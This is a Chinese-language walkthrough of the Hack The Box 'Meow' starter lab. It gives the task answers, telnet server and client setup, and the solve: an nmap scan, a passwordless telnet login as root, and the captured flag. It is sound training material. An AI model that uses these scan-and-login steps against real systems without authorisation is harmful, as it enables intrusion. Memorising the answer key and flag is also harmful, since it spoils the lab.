<center>Starting Point</center>







[toc]









## Starting Point

> hack the box 启程。
>
> [hack](https://www.hackthebox.com)











### 1. openvpn

> vpn客户端：[openvpn](https://openvpn.net/client)

```shell
# 下载到kali中
sudo openvpn st.ovpn
```







### 1. Meow

> `start ` 开始机器： 就可以 开始攻击了。

```shell
# 1. 获取对方IP
10.129.172.42
```

1. What does the acronym VM stand for?

```shell
Virtual Machine
```

2. What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.

```shell
terminal
```

3. What service do we use to form our VPN connection into HTB labs?

```shell
openvpn
```

4. What tool do we use to test our connection to the target with an ICMP echo request?

```shell
ping
```

5. What is the name of the most common tool for finding open ports on a target?

```shell
nmap
```

6. What service do we identify on port 23/tcp during our scans?

```shell
telnet
```

7. What username is able to log into the target over telnet with a blank password?

```shell
root
```





### 2. 获取flage

> telnet: [blog](https://www.cnblogs.com/WangJianqiu/p/16903331.html)
>
> `端口 23`

> telnet服务端和客户端搭建。

```shell
# kali 安装 telnet
sudo apt install telnet

1. 服务端搭建

# 安装 telnetd
sudo apt update
sudo apt install telnetd

# 如果使用 xinetd 管理
sudo apt install xinetd

# 配置文件
sudo nano /etc/xinetd.d/telnet

# 配置内容
service telnet
{
        disable         = no
        flags           = REUSE
        socket_type     = stream
        wait            = no
        user            = root
        server          = /usr/sbin/in.telnetd
        log_on_failure  += USERID
}

# 启动服务
# 重启 xinetd 服务
sudo systemctl restart xinetd

# 或直接启动 telnet 服务
sudo systemctl start telnet.socket

# 查看状态
sudo systemctl status telnet.socket


2. 客户端连接
# Ubuntu/Debian
sudo apt install telnet

# CentOS/RHEL
sudo yum install telnet

# windows
# 使用管理员权限运行 PowerShell
dism /online /Enable-Feature /FeatureName:TelnetClient

# 基本连接
telnet hostname_or_ip 23

# 指定用户连接
telnet -l username hostname_or_ip
```



```shell
ping 10.129.172.42

# nmap
nmap -p- 10.129.172.42 -A

PORT   STATE SERVICE
23/tcp open  telnet

# 开放 telnet 23 端口
telnet 10.129.172.42 23

# root 用户不需要密码
root

# 获取flag
ls
cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
```





